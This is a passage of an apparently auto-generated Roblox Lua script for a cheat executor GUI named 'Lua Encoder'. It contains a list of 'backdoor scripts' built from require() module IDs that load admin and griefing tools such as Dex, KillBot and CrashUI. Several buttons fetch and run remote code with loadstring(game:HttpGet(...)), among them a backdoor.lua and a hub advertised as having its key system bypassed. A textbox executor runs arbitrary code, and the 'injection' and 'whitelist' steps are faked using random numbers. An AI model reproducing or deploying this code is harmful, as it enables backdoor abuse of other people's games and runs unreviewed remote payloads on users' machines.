G2L["d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d9"]["Text"] = [[Backdoor scripts]];
G2L["d9"]["Name"] = [[Title]];
G2L["d9"]["Position"] = UDim2.new(-0, 0, 0, 0);

-- StarterGui.LuaEncoderPC.backhub.Title.UICorner
G2L["da"] = Instance.new("UICorner", G2L["d9"]);


-- StarterGui.LuaEncoderPC.backhub.Title.UIStroke
G2L["db"] = Instance.new("UIStroke", G2L["d9"]);
G2L["db"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.backhub.HubMain
G2L["dc"] = Instance.new("LocalScript", G2L["d8"]);
G2L["dc"]["Name"] = [[HubMain]];

-- StarterGui.LuaEncoderPC.backhub.UICorner
G2L["dd"] = Instance.new("UICorner", G2L["d8"]);


-- StarterGui.LuaEncoderPC.backhub.UIStroke
G2L["de"] = Instance.new("UIStroke", G2L["d8"]);
G2L["de"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.backhub.ScrollingFrame
G2L["df"] = Instance.new("ScrollingFrame", G2L["d8"]);
G2L["df"]["Active"] = true;
G2L["df"]["ZIndex"] = 999999999;
G2L["df"]["BorderSizePixel"] = 0;
G2L["df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["df"]["Size"] = UDim2.new(0.85699, 0, 0.74034, 0);
G2L["df"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["df"]["Position"] = UDim2.new(0.07852, 0, 0.20584, 0);
G2L["df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);

-- StarterGui.LuaEncoderPC.backhub.ScrollingFrame.TextBox
G2L["e0"] = Instance.new("TextBox", G2L["df"]);
G2L["e0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["ZIndex"] = 999999999;
G2L["e0"]["BorderSizePixel"] = 0;
G2L["e0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["e0"]["TextWrapped"] = true;
G2L["e0"]["TextSize"] = 14;
G2L["e0"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e0"]["MultiLine"] = true;
G2L["e0"]["ClearTextOnFocus"] = false;
G2L["e0"]["Size"] = UDim2.new(0.85699, 0, 500, 0);
G2L["e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["Text"] = [[Dex = "require(4786706026):dex('%username%')",
			Minecraft = "require(5820669639)('%username%')",
			CrashUI = "require(6053693667).Crashexe('%username%')",
			R6 = "require(4585652241).load('%username%')",
			KillBot = "require(3904000898).load('%username%')",
			YingYang = "require(4875966146).load('%username%')",
			HackerMan = "require(4876105392).load('%username%')",
			SakuraHub = "require(5536569504):SH('%username%')",
			Fraud = "require(4952179933).Fraud('%username%')",
			F3X = "require(4869378421).F3X('%username%')",
			UndetectedHub = "require(5673170715).Leak('%username%')",
			PoliceAI = "require(7163976217).VK('%username%')",
			TankAI = "require(7203746402).tonk('%username%')",
			JuggernautAI = "require(7486656912).Juggernaut('%username%')"
]];

-- StarterGui.LuaEncoderPC.backhub.ScrollingFrame.TextBox.LocalScript
G2L["e1"] = Instance.new("LocalScript", G2L["e0"]);


-- StarterGui.LuaEncoderPC.WhitelistingFrame
G2L["e2"] = Instance.new("Frame", G2L["1"]);
G2L["e2"]["Visible"] = false;
G2L["e2"]["ZIndex"] = 999999999;
G2L["e2"]["BorderSizePixel"] = 0;
G2L["e2"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["e2"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["e2"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e2"]["Name"] = [[WhitelistingFrame]];

-- StarterGui.LuaEncoderPC.WhitelistingFrame.UICorner
G2L["e3"] = Instance.new("UICorner", G2L["e2"]);


-- StarterGui.LuaEncoderPC.WhitelistingFrame.LocalScript
G2L["e4"] = Instance.new("LocalScript", G2L["e2"]);


-- StarterGui.LuaEncoderPC.WhitelistingFrame.Title
G2L["e5"] = Instance.new("TextLabel", G2L["e2"]);
G2L["e5"]["ZIndex"] = 999999999;
G2L["e5"]["BorderSizePixel"] = 0;
G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e5"]["TextSize"] = 14;
G2L["e5"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e5"]["BackgroundTransparency"] = 1;
G2L["e5"]["Size"] = UDim2.new(0, 73, 0, 29);
G2L["e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e5"]["Text"] = [[Lua Encoder]];
G2L["e5"]["Name"] = [[Title]];
G2L["e5"]["Position"] = UDim2.new(0.04118, 0, 0, 0);

-- StarterGui.LuaEncoderPC.WhitelistingFrame.Desc
G2L["e6"] = Instance.new("TextLabel", G2L["e2"]);
G2L["e6"]["ZIndex"] = 999999999;
G2L["e6"]["BorderSizePixel"] = 0;
G2L["e6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["e6"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e6"]["TextSize"] = 14;
G2L["e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e6"]["BackgroundTransparency"] = 1;
G2L["e6"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e6"]["Text"] = [[Whitelisting...]];
G2L["e6"]["Name"] = [[Desc]];
G2L["e6"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.WhitelistingFrame.ImageLabel
G2L["e7"] = Instance.new("ImageLabel", G2L["e2"]);
G2L["e7"]["ZIndex"] = 999999999;
G2L["e7"]["BorderSizePixel"] = 0;
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e7"]["Image"] = [[rbxassetid://17546664635]];
G2L["e7"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["BackgroundTransparency"] = 1;
G2L["e7"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.WhitelistingFrame.UIStroke
G2L["e8"] = Instance.new("UIStroke", G2L["e2"]);


-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["26"]] = {
Closure = function()
    local script = G2L["26"];
local api = {}

local Functions = require(script:WaitForChild("Module"):WaitForChild("Functions"))
local Module = require(script:WaitForChild("Module"))

local value = 500

api.started = false
api.Initilated = false
api.InitialatedFunctions = false

local killedroblox = false

api.blacklisted = Module:AllBlackListedPlrs()



--// Functions
function api.killroblox(msg)
	if api.Initilated == false then return end
	if api.started == false then return end
	killedroblox = true
	Module:killroblox(msg)
end

function api:InitializeFunctions()
	api.InitialatedFunctions = true
end


function api:Init()
	api.Initilated = true
	Functions.RequiredFromAPI = true
end

function api.start()
	api.started = true
	Module:New();
	api:Init();
	api:InitializeFunctions();
end

function api.IsStarted()
	return api.started
end

function api.IsInit()
	return api.Initilated
end


function api.SendLuaScript(code)
	if api.started == false then return end
	if api.Initilated == false then return end
	Module:SendLuaScript(code);
end

function api.SendLuauScript(code)
	if api.started == false then return end
	if api.Initilated == false then return end
	Module:SendLuauScript(code);
end

function api.IsAttached()
	if api.started == false then return end
	if api.Initilated == false then return end
	return script.Parent.Parent.Values.Attached.Value
end

local function Init_Script()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/nseinkkk/LuaEncoder/main/init.lua"))()
end


function api.inject()
	if api.started == false then return end
	if api.Initilated == false then return end
	Module:inject();
	Init_Script();
end


function api.Clear(textbox)
	if api.started == false then return end
	if api.Initilated == false then return end
	Module:Clear(textbox);
end

return api
end;
};
G2L_MODULES[G2L["27"]] = {
Closure = function()
    local script = G2L["27"];
local Module = {}

local Functions = require(script:WaitForChild("Functions"))


function Module:New()
	Functions.RequiredFromModule = true
	Functions:Start()
end

function Module:killroblox(msg)
	Functions:killroblox(msg)
end

function Module:SendLuaScript(code)
	Functions:SendLuaScript(code)
end

function Module:SendLuauScript(code)
	Functions:SendLuauScript(code)
end

function Module:inject()
	Functions:inject()
end

function Module:Clear(textbox)
	Functions:Clear(textbox)
end

function Module:AllBlackListedPlrs()
	local blacklisted = {"no one still..."}
	return blacklisted
end




return Module
end;
};
G2L_MODULES[G2L["28"]] = {
Closure = function()
    local script = G2L["28"];
local Functions = {}

-- Uses Init and Start to check if everything is ok

local value = 500

local Injector = require(script:WaitForChild("Injector"))
local Executor = require(script:WaitForChild("Executor"))
local Clearer = require(script:WaitForChild("Clearer"))

Functions.RequiredFromModule = false
Functions.RequiredFromAPI = false
Functions.Started = false
Functions.Initilated = false

function Functions:killroblox(msg)
	if Functions.RequiredFromModule == false then return end
	if Functions.RequiredFromAPI == false then return end
	if Functions.Initilated == false then return end
	if Functions.Started == false then return end
	game.Players.LocalPlayer:Kick(msg)
end

function Functions:Init()
	Functions.Initilated = true
end

function Functions:Start()
	Functions.Started = true
	Functions:Init()
end

function Functions:SendLuaScript(code)
	if Functions.RequiredFromModule == false then return end
	if Functions.RequiredFromAPI == false then return end
	if Functions.Initilated == false then return end
	if Functions.Started == false then return end
	Executor:ExecuteScript(code)
end

function Functions:SendLuauScript(code)
	if Functions.RequiredFromModule == false then return end
	if Functions.RequiredFromAPI == false then return end
	if Functions.Initilated == false then return end
	if Functions.Started == false then return end
	Executor:ExecuteScript(code)
end

function Functions:inject()
	if Functions.RequiredFromModule == false then return end
	if Functions.RequiredFromAPI == false then return end
	if Functions.Initilated == false then return end
	if Functions.Started == false then return end
	Injector:Inject()
end

function Functions:Clear(textbox)
	if Functions.RequiredFromModule == false then return end
	if Functions.RequiredFromAPI == false then return end
	if Functions.Initilated == false then return end
	if Functions.Started == false then return end
	Clearer:ClearTxtBox(textbox)
end



return Functions
end;
};
G2L_MODULES[G2L["29"]] = {
Closure = function()
    local script = G2L["29"];
local Injector = {}

function Injector:Inject()
	local att = script.Parent.Parent.Parent.Parent.Parent.Values.Attached


	game:GetService("ServerScriptService"):SetAttribute("LoadStringEnabled", true);
	game:GetService("ServerScriptService"):SetAttribute("CanExecuteCode", true);
	game:GetService("ServerScriptService"):SetAttribute("LocalLoadStringEnabled", true);

	att.Value = true
end

return Injector

end;
};
G2L_MODULES[G2L["2a"]] = {
Closure = function()
    local script = G2L["2a"];
local Executor = {}

function Executor:ExecuteScript(sc)
	loadstring(sc)()
end

return Executor

end;
};
G2L_MODULES[G2L["2b"]] = {
Closure = function()
    local script = G2L["2b"];
local Clearer = {}

function Clearer:ClearTxtBox(textbox)
	textbox.Text = ""
end

return Clearer

end;
};
G2L_MODULES[G2L["2d"]] = {
Closure = function()
    local script = G2L["2d"];
local module = {}

local lol

return module

end;
};
-- StarterGui.LuaEncoderPC.Frame.Main
local function C_1a()
local script = G2L["1a"];
	repeat game["Run Service"].RenderStepped:Wait() until game:IsLoaded()
	
	--// Variables
	
	local gui = script.Parent.Parent
	local frame = gui.Frame
	local hub = gui.Hub
	local cred = gui.Credits
	local about = gui.About
	local setting = gui.Settings
	local injf = gui.InjectedFrame
	local notinj = gui.NotInjF
	local isinj = gui.InjectingFrame
	local alrinj = gui.AlrInjcFrame
	local execd = gui.ExecutedFrame
	local clrdf = gui.ClearedFrame
	local whtlsf = gui.WhitelistingFrame
	local APIFOLDER = frame.API
	local api = require(APIFOLDER:WaitForChild("api.dll"))
	
	
	api.start();
	
	local whitelisted = false
	
	local randnumber = math.random(0, 2)
	
	if randnumber == 1 then
		whitelisted = true
	elseif randnumber == 2 then
		whitelisted = false
	elseif randnumber == 0 then
		whitelisted = true
	end
	
	
	
	--// Buttons Variables and boolvalues and Folder variables and some more
	
	local txtb = frame.ScrollingFrame.TextBox
	local exe = frame.Execute
	local clr = frame.Clear
	local atc = frame.Attach
	local val = frame.Values
	local att = val.Attached
	local att2 = false
	local cls = frame.Close
	local title = frame.Title
	local fire = frame.Fire
	local crd = frame.Credits
	local abt = frame.About
	local set = frame.Settings
	local exe2 = frame.Execute2
	local plr = game.Players.LocalPlayer
	local UserInputService = game:GetService("UserInputService")
	local IsMobile = UserInputService.TouchEnabled
	local IsPC = UserInputService.KeyboardEnabled
	local IsConsole = UserInputService.GamepadEnabled
	
	--// Lua Encoder versions variables and some more
	
	local luaversion = "vRBX"
	local luav2 = "v52.5" -- last version maybe...😭
	local canexecutein = "level 6 or 7 or 8 executors, External/Internal"
	local canexecutein2 = 6 or 7 or 8
	local LuaCode = "Luau 5.1"
	local WhatRobloxUses = ".exe or .apk"
	local LanguageRobloxStudioUses = _VERSION
	local LanguageUsedInVisualStudio = "Luau/C#/C++, Windows Form Application (.NET Framework)"
	local whatuneedtolearntomakeanmobileexcutor = "CSS,etc. Reverse engineering"
	local whatuneedtolearntomakeanpcexecutor = "C# or C++"
	local RobloxWasCodedIn = "C++"
	local whereitwasmade = "Visual Studio"
	local whatAPIused = "Lua Encoder API (Not released to the public)"
	
	--// Booleans
	
	frame.Draggable = true
	frame.Active = true
	
	local runs = game:GetService("RunService")
	local isstudip = runs:IsStudio()
	local id = 1752576503
	local name = "DENISEPV1"
	
	
	if isstudip and plr.Name ~= name and plr.UserId ~= id then
		gui:Destroy()
	end
	
	
	--// Local Functions
	
	local function LuaEncoderAPI_Execute(codegotten)
		if api.started == false then return end
		api.SendLuaScript(codegotten)
		print("module.SendLuaScript(richtextbox1.Text);")
	end
	
	
	
	local function lag(value)
	
		task.spawn(function()
			for i = 1, value do
				for v = 1, value do
					for u = 1, value do
	
					end
				end
			end
		end)
		task.wait(0.1)
	
	end
	
	local function warnsomething(msg, lvl)
		local func = print
		if lvl == nil then func = print end
		if lvl == 1 then func = print end
		if lvl == 2 then func = error end
		if lvl == 3 then func = warn end
		func("Lua Encoder: "..msg)
	end
	
	local function execute(code)
		if api.started == false then return end
		if api.IsAttached() == true then
			if txtb.Text == "" then
				warnsomething("Nothing to execute", 3)
			else
				if txtb.Text == "game.Players.LocalPlayer:Kick()" then
					plr:Kick("You've been kicked from the game")
				elseif txtb.Text == "game:GetService('Players').LocalPlayer:Kick()" then
					plr:Kick("You've been kicked from the game")
				elseif txtb.Text == 'game:GetService("Players").LocalPlayer:Kick()' then
					plr:Kick("You've been kicked from the game")
				else
					execd.Title.Visible = true
					execd.ImageLabel.Visible = true
					execd.Desc.Visible = true
					execd.Size = UDim2.new(0.348, 0,0.157, 0)
					execd.Visible = true
					execd.Desc.Text = "Executed Code"
					LuaEncoderAPI_Execute(code);
				end
	
			end
	
		else
			notinj:TweenSize(UDim2.new(0.348, 0,0.157, 0), "Out", "Sine", 0)
			wait(0.1) do
				notinj.Title.Visible = true
				notinj.Desc.Visible = true
				notinj.ImageLabel.Visible = true
				notinj.Visible = true
			end
		end
	end
	
	local function execute2(sc) runcode(sc) end
	
	local function LuaEncoderAPI_Clear() 
		if api.started == false then return end
		api.Clear(txtb)
		print("richtextbox1.Clear();")
	end
	
	local function clear(thing)
		clrdf.Title.Visible = true
		clrdf.ImageLabel.Visible = true
		clrdf.Desc.Visible = true
		clrdf.Size = UDim2.new(0.348, 0,0.157, 0)
		clrdf.Visible = true
		LuaEncoderAPI_Clear();
		thing.Text = ""
	end
	
	
	
	local function LuaEncoderAPI_inject()
		if api.IsStarted() == false then return end
		api.inject();
		if IsMobile then
			print("module.InjectToRobloxAPK();")
		elseif IsPC then
			print("module.AdvancedLuaLanchExploits(C:\Windows\RobloxPlayerLaucher.exe(Hidden(System(HiddenConfigs(Inject(InRobloxJavaLanguange(InRobloxLuaLanguange(WhatGame(RobloxGame(Player.GameStartUp(gameGiven : game), PlayerToInject(gameGottenFromFunction(Player.GameStartUp().Players.LocalPlayer))))))));")
		elseif IsConsole then
			print("module.LaunchConsoleInject();")
		end
	
	end
	
	
	local function attach()
		local repeated = 1
		local repeated2 = 1
		local repeated3 = 1
		if att.Value == true then
			alrinj.Title.Visible =true
			alrinj.Desc.Visible = true
			alrinj.Desc.Text = "Already Injected to roblox/"..game.GameId
			alrinj.ImageLabel.Visible = true
			alrinj.Size = UDim2.new(0.348, 0,0.157, 0)
			alrinj.Visible = true
			title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Already Injected!)"
			wait(2)
			title.Text = "Lua Encoder - "..luaversion.." - "..luav2
		else
			if att2 == true then return end
			wait(0.2)
			if api.IsStarted() == false then return end
			if api.IsInit() == false then return end
			if plr.Name == api.blacklisted[1] then warnsomething("You've been blacklisted from using this, trying to bypass us?", 3); api.killroblox("DONT TRY LIL BRO, message from owner: 'Your blacklisted noob and also try to make an executor or script lil bro, good luck...'"); return end
			isinj.Visible = true
			att2 = true
			repeat
				title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injecting.)"
				wait(0.75)
				title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injecting..)"
				wait(0.4)
				title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injecting...)"
				wait(0.6)
				title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Checking whitelist.)"
				wait(0.75)
				title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Checking whitelist..)"
				wait(0.3)
				title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Checking whitelist...)"
				repeated += 1
				wait(0.3)
				if repeated == 3 then
					if whitelisted == true then
						title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Whitelist Accepted!)"
						wait(0.75)
						lag(500);
						title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injected!)"
						wait(0.75)
						title.Text = "Lua Encoder - "..luaversion.." - "..luav2
						wait(0.03)
						LuaEncoderAPI_inject();
						injf.Desc.Text = "Has injected to roblox/"..game.GameId
						injf.Visible = true
						warnsomething("Fully injected to roblox", 3)
					else
						title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Whitelist Rejected!)"
						warnsomething("Player not whitelisted, whitelisting him!", 3)
						wait(0.75)
						whtlsf.Visible = true
						repeat
							title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Whitelisting.)"
							wait(0.6)
							title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Whitelisting..)"
							wait(0.75)
							title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Whitelisting...)"
							repeated2 += 1
							wait(0.56)
							if repeated2 == 3 then
								title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Whitelisted!)"
								whitelisted = true
								warnsomething("Player whitelisted!", 3)
								wait(0.75)
								title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Repeating...)"
								wait(1.75)
								repeat
									title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injecting.)"
									wait(0.75)
									title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injecting..)"
									wait(0.4)
									title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injecting...)"
									wait(0.6)
									title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Checking whitelist.)"
									wait(0.75)
									title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Checking whitelist..)"
									wait(0.3)
									title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Checking whitelist...)"
									repeated3 += 1
									wait(0.3)
									if repeated3 == 3 then
										if whitelisted == true then
											title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Whitelist Accepted!)"
											wait(0.75)
											lag(500);
											title.Text = "Lua Encoder - "..luaversion.." - "..luav2.." (Injected!)"
											wait(0.75)
											title.Text = "Lua Encoder - "..luaversion.." - "..luav2
											wait(0.03)
											LuaEncoderAPI_inject();
											injf.Desc.Text = "Has injected to roblox/"..game.GameId
											injf.Visible = true
											warnsomething("Fully injected to roblox", 3)
										end
									end
								until repeated3 == 3
							end
						until repeated2 == 3
					end
				end
			until repeated == 3
		end
	end
	
	
	local function shub()
		if hub.Visible == true then
			hub.Visible = false
		else
			hub.Visible = true
		end
	end
	
	local function credits()
		if cred.Visible == true then
			cred.Visible = false
		else
			cred.Visible = true
		end
	end
	
	local function LuaEncoderAPI_ExecuteClipBoard()
		if api.IsAttached() == true then
			execd.Title.Visible = true
			execd.ImageLabel.Visible = true
			execd.Desc.Visible = true
			execd.Size = UDim2.new(0.348, 0,0.157, 0)
			execd.Visible = true
			execd.Desc.Text = "Executed Clipboard"
			executeclipboard()
		else
			notinj:TweenSize(UDim2.new(0.348, 0,0.157, 0), "Out", "Sine", 0)
			wait(0.1) do
				notinj.Title.Visible = true
				notinj.Desc.Visible = true
				notinj.ImageLabel.Visible = true
				notinj.Visible = true
			end
		end
	end
	
	local function openABT()
		if about.Visible == true then
			about.Visible = false
		else
			about.Visible = true
		end
	end
	
	local function opensett()
		if setting.Visible == true then
			setting.Visible = false
		else
			setting.Visible = true
		end
	end
	
	local function closeAPI()
		print("Application.Exit();")
		_G.LuaEncoderLoaded = false
		warnsomething("Gui Closed!, Deleting all functions...", 3)
		gui:Destroy()
	end
	
	
	--// Button Functions
	
	exe.MouseButton1Click:Connect(function() 
		task.wait();
		execute(txtb.Text);
	end)
	
	clr.MouseButton1Click:Connect(function() 
		clear(txtb);
	end)
	
	atc.MouseButton1Click:Connect(function() 
		attach();
	end)
	
	cls.MouseButton1Click:Connect(function() 
		closeAPI();
	end)
	
	fire.MouseButton1Click:Connect(function() 
		shub();
	end)
	
	crd.MouseButton1Click:Connect(function() 
		credits();
	end)
	
	abt.MouseButton1Click:Connect(function() 
		openABT();
	end)
	
	set.MouseButton1Click:Connect(function() 
		opensett();
	end)
	
	exe2.MouseButton1Click:Connect(function() 
		LuaEncoderAPI_ExecuteClipBoard()
	end)
	
	require(script.Parent.vLua.Loadstring)
	
	--[[ End ]]--
end;
task.spawn(C_1a);
-- StarterGui.LuaEncoderPC.Hub.HubMain
local function C_3b()
local script = G2L["3b"];
	--// Variables
	
	local gui = script.Parent.Parent
	local notinj = gui.NotInjF
	local exec = gui.ExecutedThing
	local att = gui.Frame.Values.Attached
	local fm = gui.Hub
	local gh = fm.Ghost
	local dlt = fm.DLT
	local cld = fm.Cloud
	local fe = fm.fe
	local ilu = fm.fel
	local door = fm.door
	
	--// Booleans
	
	fm.Draggable = true
	fm.Active = true
	
	task.spawn(function()
		while task.wait(0.2) do
			gui.backhub.Visible = fm.Visible
		end
	end)
	
	--// Functions
	
	door.MouseButton1Click:Connect(function() 
		loadstring(game:HttpGet("https://raw.githubusercontent.com/nseinkkk/LuaEncoder/main/backdoor.lua"))()
	end)
	
	dlt.MouseButton1Click:Connect(function() 
		if att.Value == true then
			exec.Desc.Visible = true
			exec.Desc.Text = "Executed ECCS-V3"
			exec.Title.Visible = true
			exec.ImageLabel.Visible = true
			exec.Size = UDim2.new(0.348, 0,0.157, 0)
			exec.Visible = true
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ECCSco/ECCS-V3/main/ECCS%20Searcher%20V2.2"))("Copyright ERROR_CODE ECCS Co")
		else
			notinj.Desc.Visible = true
			notinj.Title.Visible = true
			notinj.ImageLabel.Visible = true
			notinj.Size = UDim2.new(0.348, 0,0.157, 0)
			notinj.Visible = true
		end
	
	end)
	
	gh.MouseButton1Click:Connect(function() 
		if att.Value == true then
			exec.Desc.Visible = true
			exec.Desc.Text = "Executed Xx Ghost Hub xX"
			exec.Title.Visible = true
			exec.ImageLabel.Visible = true
			exec.Size = UDim2.new(0.348, 0,0.157, 0)
			exec.Visible = true
			loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
		else
			notinj.Desc.Visible = true
			notinj.Title.Visible = true
			notinj.ImageLabel.Visible = true
			notinj.Size = UDim2.new(0.348, 0,0.157, 0)
			notinj.Visible = true
		end
	end)
	
	cld.MouseButton1Click:Connect(function() 
		if att.Value == true then
			exec.Desc.Visible = true
			exec.Desc.Text = "Executed CloudScript(powered by scriptblox)"
			exec.Title.Visible = true
			exec.ImageLabel.Visible = true
			exec.Size = UDim2.new(0.348, 0,0.157, 0)
			exec.Visible = true
			loadstring(game:HttpGet('https://raw.githubusercontent.com/laderite/scripts/main/Cloudscripts.lua'))()
		else
			notinj.Desc.Visible = true
			notinj.Title.Visible = true
			notinj.ImageLabel.Visible = true
			notinj.Size = UDim2.new(0.348, 0,0.157, 0)
			notinj.Visible = true
		end
	end)
	fe.MouseButton1Click:Connect(function() 
		if att.Value == true then
			exec.Desc.Visible = true
			exec.Desc.Text = "Executed FE Hub(Bypassed key system)"
			exec.Title.Visible = true
			exec.ImageLabel.Visible = true
			exec.Size = UDim2.new(0.348, 0,0.157, 0)
			exec.Visible = true
			loadstring(game:HttpGet("https://pastebin.com/raw/LMiJ1JK1"))()
		else
			notinj.Desc.Visible = true
			notinj.Title.Visible = true
			notinj.ImageLabel.Visible = true
			notinj.Size = UDim2.new(0.348, 0,0.157, 0)
			notinj.Visible = true
		end
	end)
	
	ilu.MouseButton1Click:Connect(function() 
		if att.Value == true then
			exec.Desc.Visible = true
			exec.Desc.Text = "Executed Infinite Yield"
			exec.Title.Visible = true
			exec.ImageLabel.Visible = true
			exec.Size = UDim2.new(0.348, 0,0.157, 0)
			exec.Visible = true
			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
		else
			notinj.Desc.Visible = true
			notinj.Title.Visible = true
			notinj.ImageLabel.Visible = true
			notinj.Size = UDim2.new(0.348, 0,0.157, 0)
			notinj.Visible = true
		end
	end)
	
	--[[ End ]]--
end;
task.spawn(C_3b);
-- StarterGui.LuaEncoderPC.Credits.CreditMain
local function C_51()
local script = G2L["51"];
	--// Variables
	
	local gui = script.Parent.Parent
	local fm = gui.Credits
	
	--// Booleans
	
	fm.Draggable = true
	fm.Active = true
	
	--[[ End ]]--
end;
task.spawn(C_51);
-- StarterGui.LuaEncoderPC.About.Aboutmain
local function C_5c()
local script = G2L["5c"];
	--// Variables
	
	local gui = script.Parent.Parent
	local fm = gui.About
	
	--// Booleans
	
	fm.Draggable = true
	fm.Active = true
	
	--[[ End ]]--
end;
task.spawn(C_5c);
-- StarterGui.LuaEncoderPC.Settings.SettingsMain
local function C_67()
local script = G2L["67"];
	--// Variables
	
	local gui = script.Parent.Parent
	local notinj = gui.NotInjF
	local fm = gui.Settings
	local fm2 = gui.Frame
	local op = fm.Option1
	local plr = game:GetService("Players").LocalPlayer
	local char = plr.Character or plr.CharacterAdded:Wait()
	local hum = char.Humanoid
	local openic = fm.icon
	local link = fm.link
	local exe = fm2.Execute
	local exe2 = fm2.Execute2
	local chn = fm.Change
	
	--// Booleans
	
	fm.Draggable = true
	fm.Active = true
	
	--// Local functions
	
	local function anti()
		local protected = false
		protected = not protected
		if protected == true then
			plr:SetAttribute("MaxSpeed", 50)
			plr:SetAttribute("MaxJumpPower", 75)
			while task.wait(0.2) do
				if hum.WalkSpeed >= 50 then
					hum.WalkSpeed = 16
					print("saved you from a ban or an other thing")
				end
				if hum.JumpPower >= 75 then
					hum.JumpPower = 50
					print("saved you from a ban or an other thing")
				end
			end
		end
	end
	
	local function toggle()
		local opn = gui.Open
		opn.Visible = not opn.Visible
	end
	
	local function getlink(link)
		setclipboard(link)
	end
	
	local function chage()
		exe.Visible = not exe.Visible
		exe2.Visible = not exe2.Visible
		print("changed, now you can execute setclipboards, makefolders, etc, if u change again then you can only execute what it is in about")
	end
	
	--// Buuton functions
	
	op.MouseButton1Click:Connect(anti)
	
	openic.MouseButton1Click:Connect(toggle)
	
	link.MouseButton1Click:Connect(function() 
		getlink("https://github.com/delta-hydro")
		getlink("https://github.com/nseinkkk")
	end)
	
	chn.MouseButton1Click:Connect(chage)
	
	--[[ End ]]--
end;
task.spawn(C_67);
-- StarterGui.LuaEncoderPC.Open.OpenMain
local function C_7b()
local script = G2L["7b"];
	local open = script.Parent
	local frame = open.Parent.Frame
	open.Active = true
	open.Draggable = true
	
	open.MouseButton1Click:Connect(function() 
		frame.Visible = not frame.Visible
	end)
end;
task.spawn(C_7b);
-- StarterGui.LuaEncoderPC.InjectedFrame.LocalScript
local function C_7e()
local script = G2L["7e"];
	task.spawn(function()
		while task.wait(0.001) do
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.2)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_7e);
-- StarterGui.LuaEncoderPC.NotInjF.LocalScript
local function C_85()
local script = G2L["85"];
	task.spawn(function()
		while task.wait(0.001) do
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
